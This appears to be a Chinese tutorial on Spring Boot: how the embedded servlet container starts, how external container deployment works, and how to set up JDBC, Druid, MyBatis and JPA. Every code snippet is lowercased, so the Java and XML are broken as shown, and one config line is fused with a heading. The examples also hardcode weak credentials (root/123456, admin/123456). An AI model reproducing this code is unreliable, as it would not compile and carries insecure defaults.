arraylist<embeddedservletcontainercustomizer>(\n            this.beanfactory\n            //从容器中获取所有这葛类型的组件：embeddedservletcontainercustomizer\n            //定制servlet容器，给容器中可以添加一个embeddedservletcontainercustomizer类型的组件\n            .getbeansoftype(embeddedservletcontainercustomizer.class,\n                            false, false)\n            .values());\n        collections.sort(this.customizers, annotationawareordercomparator.instance);\n        this.customizers = collections.unmodifiablelist(this.customizers);\n    }\n    return this.customizers;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n1）、springboot根据导入的依赖情况，给容器中添加相应的 embeddedservletcontainerfactory【tomcatembeddedservletcontainerfactory】\n\n2）、容器中某个组件要创建对象就会惊动后置处理器。embeddedservletcontainercustomizerbeanpostprocessor。只要是嵌入式的servlet容器工厂，后置处理器就工作。\n\n3）、后置处理器，从容器中获取所有的embeddedservletcontainercustomizer，调用定制器的定制方法\n\n\n# 嵌入式servlet容器启动原理\n\n什么时候创建嵌入式的servlet容器工厂？什么时候获取嵌入式的servlet容器并启动tomcat？获取嵌入式的servlet容器工厂：\n\n 1. springboot应用启动运行run方法\n 2. refreshcontext(context)。springboot刷新ioc容器【创建ioc容器对象，并初始化容器，创建容器中的每一 个组件】。如果是web应用创建annotationconfigembeddedwebapplicationcontext，否则： annotationconfigapplicationcontext\n 3. refresh(context)。刷新刚才创建好的ioc容器。\n\npublic void refresh() throws beansexception, illegalstateexception {\n    synchronized (this.startupshutdownmonitor) {\n        // prepare this context for refreshing.\n        preparerefresh();\n        // tell the subclass to refresh the internal bean factory.\n        configurablelistablebeanfactory beanfactory = obtainfreshbeanfactory();\n        // prepare the bean factory for use in this context.\n        preparebeanfactory(beanfactory);\n        try {\n            // allows post‐processing of the bean factory in context subclasses.\n            postprocessbeanfactory(beanfactory);\n            // invoke factory processors registered as beans in the context.\n            invokebeanfactorypostprocessors(beanfactory);\n            // register bean processors that intercept bean creation.\n            registerbeanpostprocessors(beanfactory);\n            // initialize message source for this context.\n            initmessagesource();\n            // initialize event multicaster for this context.\n            initapplicationeventmulticaster();\n            // initialize other special beans in specific context subclasses.\n            onrefresh();\n            // check for listener beans and register them.\n            registerlisteners();\n            // instantiate all remaining (non‐lazy‐init) singletons.\n            finishbeanfactoryinitialization(beanfactory);\n            // last step: publish corresponding event.\n            finishrefresh();\n        }\n        catch (beansexception ex) {\n            if (logger.iswarnenabled()) {\n                logger.warn("exception encountered during context initialization ‐ " +\n                            "cancelling refresh attempt: " + ex);\n            }\n            // destroy already created singletons to avoid dangling resources.\n            destroybeans();\n            // reset \'active\' flag.\n            cancelrefresh(ex);\n            // propagate exception to caller.\n            throw ex;\n        }\n        finally {\n            // reset common introspection caches in spring\'s core, since we\n            // might not ever need metadata for singleton beans anymore...\n            resetcommoncaches();\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n 4. onrefresh()。web的ioc容器重写了onrefresh方法\n\n 5. webioc容器会创建嵌入式的servlet容器。createembeddedservletcontainer()。\n\n 6. 获取嵌入式的servlet容器工厂\n    \n    embeddedservletcontainerfactory containerfactory = getembeddedservletcontainerfactory(); 从ioc容器中获取embeddedservletcontainerfactory组件。tomcatembeddedservletcontainerfactory创建对象，后置处理器一看是这个对象，就获取所有的定制器来先定制servlet容器的相关配置。\n\n 7. 使用容器工厂获取嵌入式的servlet容器：this.embeddedservletcontainer = containerfactory .getembeddedservletcontainer(getselfinitializer());\n\n 8. 嵌入式的servlet容器创建对象并启动servlet容器\n\n 9. 先启动嵌入式的servlet容器，再将ioc容器中剩下没有创建出的对象获取出来。\n\n\n# 使用外置的servlet容器\n\n 1. 必须创建一个war项目\n\n 2. 将嵌入式的tomcat指定为provided\n    \n    <dependency>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring‐boot‐starter‐tomcat</artifactid>\n        <scope>provided</scope>\n    </dependency>\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 3. 必须编写一个springbootservletinitializer的子类，并调用configure方法\n    \n    public class servletinitializer extends springbootservletinitializer {\n        @override\n        protected springapplicationbuilder configure(springapplicationbuilder application) {\n            //传入springboot应用的主程序\n            return application.sources(springboot04webjspapplication.class);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 4. 启动服务器就可以使用\n\n\n# 外置servlet原理\n\njar包：执行springboot主类的main方法，启动ioc容器，创建嵌入式的servlet容器\n\nwar包：启动服务器，服务器启动springboot应用【springbootservletinitializer】，启动ioc容器\n\n规则：\n\n1）、服务器启动（web应用启动）会创建当前web应用里面每一个jar包里面servletcontainerinitializer实例\n\n2）、servletcontainerinitializer的实现放在jar包的meta-inf/services文件夹下，有一个名为javax.servlet.servletcontainerinitializer的文件，内容就是servletcontainerinitializer的实现类的全类名\n\n3）、还可以使用@handlestypes，在应用启动的时候加载我们感兴趣的类；\n\n流程：\n\n1）、启动tomcat\n\n2）、org\\springframework\\spring-web\\4.3.14.release\\spring-web-4.3.14.release.jar!\\metainf\\services\\javax.servlet.servletcontainerinitializer：\n\nspring的web模块里面有这个文件：org.springframework.web.springservletcontainerinitializer\n\n3）、`springservletcontainerinitializer`将`@handlestypes(webapplicationinitializer.class)`标注的所有这个类型 的类都传入到onstartup方法的`<set>`，为这些`webapplicationinitializer`类型的类创建实例\n\n\n4）、每一个webapplicationinitializer都调用自己的onstartup。相当于我们的springbootservletinitializer的类会被创建对象，并执行onstartup方法。\n\n6）、springbootservletinitializer实例执行onstartup的时候会createrootapplicationcontext创建容器\n\nprotected webapplicationcontext createrootapplicationcontext(\n    servletcontext servletcontext) {\n    //1、创建springapplicationbuilder\n    springapplicationbuilder builder = createspringapplicationbuilder();\n    standardservletenvironment environment = new standardservletenvironment();\n    environment.initpropertysources(servletcontext, null);\n    builder.environment(environment);\n    builder.main(getclass());\n    applicationcontext parent = getexistingrootwebapplicationcontext(servletcontext);\n    if (parent != null) {\n        this.logger.info("root context already created (using as parent).");\n        servletcontext.setattribute(\n            webapplicationcontext.root_web_application_context_attribute, null);\n        builder.initializers(new parentcontextapplicationcontextinitializer(parent));\n    }\n    builder.initializers(\n        new servletcontextapplicationcontextinitializer(servletcontext));\n    builder.contextclass(annotationconfigembeddedwebapplicationcontext.class);\n    //调用configure方法，子类重写了这个方法，将springboot的主程序类传入了进来\n    builder = configure(builder);\n    //使用builder创建一个spring应用\n    springapplication application = builder.build();\n    if (application.getsources().isempty() && annotationutils\n        .findannotation(getclass(), configuration.class) != null) {\n        application.getsources().add(getclass());\n    }\n    assert.state(!application.getsources().isempty(),\n                 "no springapplication sources have been defined. either override the "\n                 + "configure method or add an @configuration annotation");\n    // ensure error pages are registered\n    if (this.registererrorpagefilter) {\n        application.getsources().add(errorpagefilterconfiguration.class);\n    }\n    //启动spring应用\n    return run(application);\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n7）、spring的应用就启动并且创建ioc容器\n\npublic configurableapplicationcontext run(string... args) {\n    stopwatch stopwatch = new stopwatch();\n    stopwatch.start();\n    configurableapplicationcontext context = null;\n    failureanalyzers analyzers = null;\n    configureheadlessproperty();\n    springapplicationrunlisteners listeners = getrunlisteners(args);\n    listeners.starting();\n    try {\n        applicationarguments applicationarguments = new defaultapplicationarguments(\n            args);\n        configurableenvironment environment = prepareenvironment(listeners,\n                                                                 applicationarguments);\n        banner printedbanner = printbanner(environment);\n        context = createapplicationcontext();\n        analyzers = new failureanalyzers(context);\n        preparecontext(context, environment, listeners, applicationarguments,\n                       printedbanner);\n        //刷新ioc容器\n        refreshcontext(context);\n        afterrefresh(context, applicationarguments);\n        listeners.finished(context, null);\n        stopwatch.stop();\n        if (this.logstartupinfo) {\n            new startupinfologger(this.mainapplicationclass)\n                .logstarted(getapplicationlog(), stopwatch);\n        }\n        return context;\n    }\n    catch (throwable ex) {\n        handlerunfailure(context, listeners, analyzers, ex);\n        throw new illegalstateexception(ex);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# springboot数据交互\n\n\n# jdbc\n\n添加依赖：\n\n<dependency>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-starter-jdbc</artifactid>\n</dependency>\n\n<dependency>\n  <groupid>mysql</groupid>\n  <artifactid>mysql-connector-java</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n配置配置文件\n\n# 此处如果切换为高版本的mysql驱动 需要更换为cj下的driver\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.driver  \n\n# 如果因为驱动版本小于数据库的版本可能会导致连接问题。加上参数usessl=false可以解决，建议更换版本。\nspring.datasource.url=jdbc:mysql://localhost:3307/springboot\nspring.datasource.username=root\nspring.datasource.password=123456\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n添加测试依赖：\n\n<dependency>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-starter-test</artifactid>\n  <scope>test</scope>\n  </dependency>\n\n\n1\n2\n3\n4\n5\n\n\n配置启动器，如果不配置，测试启动会报错。\n\npackage com.pwddd.jdbc;\n\nimport org.springframework.boot.springapplication;\nimport org.springframework.boot.autoconfigure.springbootapplication;\n\n@springbootapplication\npublic class jdbcapplication {\n  public static void main(string[] args) {\n    springapplication.run(jdbcapplication.class,args);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n测试：\n\nimport com.pwddd.jdbc.jdbcapplication;\nimport org.junit.test;\nimport org.junit.runner.runwith;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.test.context.springboottest;\nimport org.springframework.jdbc.core.jdbctemplate;\nimport org.springframework.test.context.contextconfiguration;\nimport org.springframework.test.context.junit4.springrunner;\n\nimport javax.sql.datasource;\nimport java.sql.sqlexception;\n\n@runwith(springrunner.class)\n@springboottest(classes = {jdbcapplication.class})  // 此处如果不指定class,且当前测试类的路径和启动类的路径不一致，则找不到启动类报错。https://blog.csdn.net/pmdream/article/details/109119689\npublic class testjdbc {\n\n  @autowired\n  jdbctemplate jdbctemplate;\n\n  @autowired\n  datasource datasource;\n\n  @test\n  public void test() throws sqlexception {\n    system.out.println(datasource.getconnection());\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 数据交互配置原理\n\n在springboot中默认使用org.apache.tomcat.jdbc.pool.datasource作为数据源。数据源的相关配置在datasourceproperties中。在org.springframework.boot.autoconfigure.jdbc.datasourceconfiguration根据条件给容器中添加了多种数据源。可以使用spring.datasource.type配置要使用的数据源。如下面的代码所示\n\n@conditionalonclass({org.apache.tomcat.jdbc.pool.datasource.class})\n@conditionalonproperty(\n  name = {"spring.datasource.type"},\n  havingvalue = "org.apache.tomcat.jdbc.pool.datasource",\n  matchifmissing = true\n)\nstatic class tomcat extends datasourceconfiguration {\n  tomcat() {\n  }\n\n  @bean\n  @configurationproperties(\n    prefix = "spring.datasource.tomcat"\n  )\n  public org.apache.tomcat.jdbc.pool.datasource datasource(datasourceproperties properties) {\n    org.apache.tomcat.jdbc.pool.datasource datasource = (org.apache.tomcat.jdbc.pool.datasource)this.createdatasource(properties, org.apache.tomcat.jdbc.pool.datasource.class);\n    databasedriver databasedriver = databasedriver.fromjdbcurl(properties.determineurl());\n    string validationquery = databasedriver.getvalidationquery();\n    if (validationquery != null) {\n      datasource.settestonborrow(true);\n      datasource.setvalidationquery(validationquery);\n    }\n\n    return datasource;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n除此之外，在org.springframework.boot.autoconfigure.jdbc.datasourceinitializer中定义了在程序运行时进行的数据操作：运行建表语句和创建数据库的语句。sql语句位于classpath下的schema/data-all.sql或者schema/data.sql，也可以指定spring.datasource.data/schema\n\nlist<resource> scripts = this.getscripts("spring.datasource.data", this.properties.getdata(), "data");\nlist<resource> scripts = this.getscripts("spring.datasource.schema", this.properties.getschema(), "schema");\nprivate list<resource> getscripts(string propertyname, list<string> resources, string fallback) {\n  if (resources != null) {\n    return this.getresources(propertyname, resources, true);\n  } else {\n    string platform = this.properties.getplatform();\n    list<string> fallbackresources = new arraylist();\n    fallbackresources.add("classpath*:" + fallback + "-" + platform + ".sql");\n    fallbackresources.add("classpath*:" + fallback + ".sql");\n    return this.getresources(propertyname, fallbackresources, false);\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n如下所示：\n\nspring.datasource.schema=classpath:sql/schema-all.sql\nspring.datasource.data=classpath:sql/data-all.sql\n\n\n1\n2\n\n\nspringboot默认配置了一个jdbctemplate数据源\n\n@test\npublic void testjdbctemplate(){\n  list<map<string, object>> maps = jdbctemplate.queryforlist("select * from t_admin");\n  system.out.println(maps.get(0));\n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# druid数据源\n\n引入druid数据源\n\n<dependency>\n  <groupid>com.alibaba</groupid>\n  <artifactid>druid</artifactid>\n  <version>1.2.8</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n指定数据源的类型：\n\nspring.datasource.type=com.alibaba.druid.pool.druiddatasource\n\n\n1\n\n\n配置文件中配置相关的参数：\n\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.driver\nspring.datasource.url=jdbc:mysql://localhost:3307/springboot\nspring.datasource.username=root\nspring.datasource.password=123456\nspring.datasource.type=com.alibaba.druid.pool.druiddatasource\nspring.datasource.schema=classpath:sql/schema-all.sql\nspring.datasource.data=classpath:sql/data-all.sql\n\n# druid配置\nspring.datasource.initialsize: 5\nspring.datasource.min-idle=5\nspring.datasource.max-active=20\nspring.datasource.max-wait=60000\nspring.datasource.time-between-eviction-runs-millis=6000\nspring.datasource.min-evictable-idle-time-millis=300000\nspring.datasource.validation-query=select 1 from dual\nspring.datasource.test-while-idle=false\nspring.datasource.test-on-return=false\nspring.datasource.pool-prepared-statements=true\n\nspring.datasource.druid.filters=stat,wall,log4j\nspring.datasource.druid.max-pool-prepared-statement-per-connection-size=20\nspring.datasource.druid.use-global-data-source-stat=true\nspring.datasource.druid.connection-properties=druid.stat.mergesql=true;druid.stat.slowsqlmillis=500\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n直接这么配置没有办法注入到参数中，我们需要自定义druid的配置类，然后指定配置文件的前缀\n\npackage com.pwddd.jdbc.config;\n\nimport com.alibaba.druid.pool.druiddatasource;\nimport org.springframework.boot.context.properties.configurationproperties;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport javax.sql.datasource;\n\n@configuration\npublic class druidconfig {\n\n  @configurationproperties(prefix = "spring.datasource.druid")\n  @bean\n  public datasource druiddatasource(){\n    return new druiddatasource();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n配置druid的监控\n\npackage com.pwddd.jdbc.config;\n\nimport com.alibaba.druid.pool.druiddatasource;\nimport com.alibaba.druid.support.http.statviewservlet;\nimport com.alibaba.druid.support.http.webstatfilter;\nimport org.springframework.boot.context.properties.configurationproperties;\nimport org.springframework.boot.web.servlet.filterregistrationbean;\nimport org.springframework.boot.web.servlet.servletregistrationbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport javax.sql.datasource;\nimport java.util.arrays;\nimport java.util.hashmap;\n\n@configuration\npublic class druidconfig {\n\n  @configurationproperties(prefix = "spring.datasource.druid")\n  @bean\n  public datasource druiddatasource(){\n    return new druiddatasource();\n  }\n\n  @bean\n  public servletregistrationbean statviewservlet(){\n\n    servletregistrationbean registrationbean = new servletregistrationbean(new statviewservlet(), "/druid/*");\n    hashmap<string, string> map = new hashmap<>();\n    map.put("loginusername","admin");\n    map.put("loginpassword","123456");\n    registrationbean.setinitparameters(map);\n    return registrationbean;\n  }\n\n  @bean\n  public filterregistrationbean webstatfilter(){\n    filterregistrationbean registrationbean = new filterregistrationbean(new webstatfilter());\n    hashmap<string, string> initparameters = new hashmap<>();\n    initparameters.put("exclusions","*.js,*.css,*.html,/druid/*");\n    registrationbean.setinitparameters(initparameters);\n    registrationbean.seturlpatterns(arrays.aslist("/*"));\n    return registrationbean;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# 整合mybatis\n\n 1. 引入相关依赖：\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n  <modelversion>4.0.0</modelversion>\n\n  <groupid>com.pwddd.mybatis</groupid>\n  <artifactid>springboot-mybatis</artifactid>\n  <version>1.0-snapshot</version>\n\n  <parent>\n    <artifactid>spring-boot-starter-parent</artifactid>\n    <groupid>org.springframework.boot</groupid>\n    <version>1.5.9.release</version>\n  </parent>\n\n  <properties>\n    <maven.compiler.source>8</maven.compiler.source>\n    <maven.compiler.target>8</maven.compiler.target>\n  </properties>\n\n  <dependencies>\n    <dependency>\n      <groupid>org.springframework.boot</groupid>\n      <artifactid>spring-boot-starter-web</artifactid>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework.boot</groupid>\n      <artifactid>spring-boot-starter-test</artifactid>\n      <scope>test</scope>\n    </dependency>\n\n    <dependency>\n      <groupid>mysql</groupid>\n      <artifactid>mysql-connector-java</artifactid>\n      <version>8.0.28</version>\n      <scope>runtime</scope>\n    </dependency>\n\n    <dependency>\n      <groupid>com.alibaba</groupid>\n      <artifactid>druid</artifactid>\n      <version>1.2.8</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.mybatis.spring.boot</groupid>\n      <artifactid>mybatis-spring-boot-starter</artifactid>\n      <version>2.2.2</version>\n    </dependency>\n  </dependencies>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n 2. 配置druid数据源\n\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.driver\nspring.datasource.url=jdbc:mysql://localhost:3307/springboot\nspring.datasource.username=root\nspring.datasource.password=123456\nspring.datasource.type=com.alibaba.druid.pool.druiddatasource\nspring.datasource.schema=classpath:sql/schema-all.sql\nspring.datasource.data=classpath:sql/data-all.sql\n\n# druid配置\nspring.datasource.initialsize: 5\nspring.datasource.min-idle=5\nspring.datasource.max-active=20\nspring.datasource.max-wait=60000\nspring.datasource.time-between-eviction-runs-millis=6000\nspring.datasource.min-evictable-idle-time-millis=300000\nspring.datasource.validation-query=select 1 from dual\nspring.datasource.test-while-idle=false\nspring.datasource.test-on-return=false\nspring.datasource.pool-prepared-statements=true\n\nspring.datasource.druid.filters=stat,wall,log4j\nspring.datasource.druid.max-pool-prepared-statement-per-connection-size=20\nspring.datasource.druid.use-global-data-source-stat=true\nspring.datasource.druid.connection-properties=druid.stat.mergesql=true;druid.stat.slowsqlmillis=500\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\npackage com.pwddd.mybatis.config;\n\nimport com.alibaba.druid.pool.druiddatasource;\nimport com.alibaba.druid.support.http.statviewfilter;\nimport com.alibaba.druid.support.http.statviewservlet;\nimport com.alibaba.druid.support.http.webstatfilter;\nimport org.springframework.boot.context.properties.configurationproperties;\nimport org.springframework.boot.web.servlet.filterregistrationbean;\nimport org.springframework.boot.web.servlet.servletregistrationbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport javax.sql.datasource;\nimport java.util.arrays;\nimport java.util.hashmap;\n\n@configuration\npublic class druidconfig {\n\n    @configurationproperties("spring.datasource")\n    @bean\n    public datasource datasource(){\n        return new druiddatasource();\n    }\n\n    @bean\n    public servletregistrationbean statviewservlet(){\n        servletregistrationbean registrationbean =\n                new servletregistrationbean(new statviewservlet(),"/druid/*");\n        hashmap<string, string> map = new hashmap<>();\n        map.put("loginusername","admin");\n        map.put("loginpassword","123456");\n        registrationbean.setinitparameters(map);\n        return registrationbean;\n    }\n\n    @bean\n    public filterregistrationbean statfilter(){\n        webstatfilter filter = new webstatfilter();\n        filterregistrationbean bean = new filterregistrationbean(filter);\n        hashmap<string, string> initparameters = new hashmap<>();\n        initparameters.put("exclusions","*.js,*.html,*.css,/druid/*");\n        bean.setinitparameters(initparameters);\n        bean.seturlpatterns(arrays.aslist("/*"));\n        return bean;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n 3. 创建javabean\n\npackage com.pwddd.mybatis.bean;\n\nimport lombok.allargsconstructor;\nimport lombok.data;\nimport lombok.noargsconstructor;\n\n@data\n@allargsconstructor\n@noargsconstructor\npublic class admin {\n  private string id;\n  private string username;\n  private string passwd;\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n 4. 创建mapper和对应的接口\n\npackage com.pwddd.mybatis.mapper;\n\nimport com.pwddd.mybatis.bean.admin;\nimport org.apache.ibatis.annotations.mapper;\n\nimport java.util.list;\n\n@mapper\npublic interface adminmapper {\n\n  list<admin> list();\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype mapper public "-//mybatis.org//dtd mapper 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-mapper.dtd" >\n<mapper namespace="com.pwddd.mybatis.mapper.adminmapper">\n\n  <select id="list" resulttype="admin">\n    select * from t_admin\n  </select>\n</mapper>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n 5. 添加配置\n\nmybatis.mapper-locations=classpath:mapper/*.xml\nmybatis.type-aliases-package=com.pwddd.mybatis.be注入mapper\n\n\n1\n2\n\n\n@restcontroller\n@requestmapping("/admin")\npublic class admincontroller {\n\n  @autowired\n  private adminmapper adminmapper;\n\n  @requestmapping("/list")\n  public list<admin> adminlist(){\n    return adminmapper.list();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 6. 批量扫描包\n\n@springbootapplication\n@mapperscan(basepackages = "com.pwddd.mybatis.mapper")\npublic class mybatisapplication {\n  public static void main(string[] args) {\n    springapplication.run(mybatisapplication.class,args);\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 7. 自定义myabtis配置\n\nspringboot配置mybatis也是使用自动配置完成的。在创建sql sessionfactory时会获取所有的configuration，因此我们只需要自定义一个configurationcustomizer，然后加入到容器中即可。\n\npackage com.pwddd.mybatis.config;\n\nimport org.mybatis.spring.boot.autoconfigure.configurationcustomizer;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\n@configuration\npublic class mybatisconfig {\n\n  @bean\n  public configurationcustomizer configurationcustomizer(){\n    return new configurationcustomizer() {\n\n      @override\n      public void customize(org.apache.ibatis.session.configuration configuration) {\n        configuration.setaggressivelazyloading(true);\n      }\n    };\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n源码：\n\nprivate void applyconfiguration(sqlsessionfactorybean factory) {\n  org.apache.ibatis.session.configuration configuration = this.properties.getconfiguration();\n  if (configuration == null && !stringutils.hastext(this.properties.getconfiglocation())) {\n    configuration = new org.apache.ibatis.session.configuration();\n  }\n\n  if (configuration != null && !collectionutils.isempty(this.configurationcustomizers)) {\n    iterator var3 = this.configurationcustomizers.iterator();\n\n    while(var3.hasnext()) {\n      configurationcustomizer customizer = (configurationcustomizer)var3.next();\n      customizer.customize(configuration);\n    }\n  }\n\n  factory.setconfiguration(configuration);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n 8. 配置全局配置文件\n\nmybatis.config-location=classpath:mybatis-config.xml\n\n\n1\n\n\n\n# 整合jpa\n\n# springdata简介\n\n\n\n应用程序面向springdata编程，由springdata帮助我们完成具体的实现。\n\n# 整合方法\n\n 1. 创建项目，引入spring-boot-starter-jpa\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n  <modelversion>4.0.0</modelversion>\n\n  <groupid>com.pwddd.jpa</groupid>\n  <artifactid>springboot-jpa</artifactid>\n  <version>1.0-snapshot</version>\n\n  <parent>\n    <artifactid>spring-boot-starter-parent</artifactid>\n    <groupid>org.springframework.boot</groupid>\n    <version>1.5.9.release</version>\n  </parent>\n\n  <properties>\n    <maven.compiler.source>8</maven.compiler.source>\n    <maven.compiler.target>8</maven.compiler.target>\n  </properties>\n\n  <dependencies>\n    <dependency>\n      <groupid>org.springframework.boot</groupid>\n      <artifactid>spring-boot-starter-data-jpa</artifactid>\n    </dependency>\n\n    <dependency>\n      <groupid>mysql</groupid>\n      <artifactid>mysql-connector-java</artifactid>\n      <version>8.0.28</version>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework.boot</groupid>\n      <artifactid>spring-boot-starter-jdbc</artifactid>\n    </dependency>\n\n    <dependency>\n      <groupid>org.springframework.boot</groupid>\n      <artifactid>spring-boot-starter-web</artifactid>\n    </dependency>\n  </dependencies>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n 2. 创建配置文件\n\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.driver\n    password: 123456\n    username: root\n    url: jdbc:mysql://localhost:3307/springboot\n\n\n1\n2\n3\n4\n5\n6\n\n 3. 编写实体类，配置映射关系\n\npackage com.pwddd.jpa.entity;\n\nimport lombok.allargsconstructor;\nimport lombok.data;\nimport lombok.noargsconstructor;\n\nimport javax.persistence.*;\nimport javax.persistence.criteria.criteriabuilder;\n\n@data\n@allargsconstructor\n@noargsconstructor\n@entity // 配置标识\n@table(name = "t_admin") // 配置数据表\npublic class admin {\n    @id\n    @generatedvalue(strategy = generationtype.identity) // 自增主键\n    private integer id;\n\n    @column(name = "user_name",length = 255)\n    private string username;\n    @column(length = 255)\n    private string passwd;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 4. 编写接口操作数据\n\npackage com.pwddd.jpa.repository;\n\nimport com.pwddd.jpa.entity.admin;\nimport org.springframework.data.jpa.repository.jparepository;\n//                                                    操作的实体，主键类型\npublic interface adminrepository extends jparepository<admin,string> {\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 5. 配置jpa\n\njpa:\n\thibernate:\n\t\tddl-auto: update # 更新或者创建表结构\n\tshow-sql: true # 显示查询\n\n\n1\n2\n3\n4\n\n 6. 注入repository\n\npackage com.pwddd.jpa.controller;\n\nimport com.pwddd.jpa.entity.admin;\nimport com.pwddd.jpa.repository.adminrepository;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.web.bind.annotation.requestmapping;\nimport org.springframework.web.bind.annotation.restcontroller;\n\n@restcontroller\n@requestmapping("/admin")\npublic class admincontroller {\n\n    @autowired\n    private adminrepository repository;\n\n    @requestmapping("/add")\n    public void addadmin(admin admin){\n        repository.save(admin);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# springboot 